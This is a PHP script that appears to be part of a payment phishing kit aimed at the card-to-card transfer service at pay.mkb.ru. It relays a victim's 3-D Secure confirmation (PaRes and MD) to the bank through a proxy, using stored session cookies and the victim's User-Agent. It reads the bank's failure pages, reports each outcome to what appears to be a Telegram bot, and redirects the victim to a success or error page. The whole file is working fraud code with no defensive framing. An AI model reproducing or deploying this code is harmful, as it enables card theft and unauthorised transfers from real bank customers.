<?php
include $_SERVER['DOCUMENT_ROOT'].'/config.php';
$PaRes = $_POST["PaRes"];
$MD = $_POST["MD"];
date_default_timezone_set("Europe/Moscow");
if (isset($_POST["MD"]) && $_POST["MD"] != null){
    if (!file_exists("temp/" . $_POST["MD"]))
        die("Указанный платеж не существует.");
    $temp_data = json_decode(file_get_contents("temp/" . $MD), true);
    
    
    
    $ch = curl_init($temp_data["TermUrl"]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        "User-Agent: ".getallheaders()['User-Agent'],
        "Cookie: session_c2c=" . $temp_data["session_c2c"] . " ; __sp=" . $temp_data["sp"],
     
    ));
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST));
    curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
    $response = curl_exec($ch);
      curl_close($ch);
   
 $status["success"] = true;
if(strstr($response, "parent.location.href = '/fail")){
   $status["success"] = false;  
   $peremen = 'fail';
}
if(strstr($response, "parent.location.href = '/bad")){
     $status["success"] = false; 
     $peremen = 'bad';
}
if(strstr($response, "parent.location.href = '/error")){
     $status["success"] = false;  
      $peremen = 'error';
}
if(strstr($response, "При выполнении запроса произошла ошибка.")){
     $status["success"] = false;  
      $peremen = 'Непредвиденная ошибка!';
}           
            if (!$status["success"]){
                $failUrl = "https://pay.mkb.ru/" . FastCut($response, "parent.location.href = '/", "';");
                
                $ch = curl_init($failUrl);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, [
                    "Cookie: complete=; session_c2c=" . $temp_data["session_c2c"] . " ; __sp=" . $temp_data["sp"],
                   "User-Agent: ".getallheaders()['User-Agent']
                ]);
                curl_setopt($ch, CURLOPT_PROXY, $proxy);
                curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pass);
                $response = curl_exec($ch);
                curl_close($ch);
           
                if ($response){
                
                    $errorReason = FastCut($response, '<div class="page-subtitle">', '</div>');

                    getError($token,$chatid,$areaname,$errorReason,$peremen);

              header('Location: error.html');
                }
           
                   
            }else{

                getSuccess($token,$bot_receiver,$chatid,$areaname,$zalet);
            
            header('Location: success.html');
            }
}
function FastCut($data, $from, $to){
    return explode($to, explode($from, $data)[1])[0];
}
?>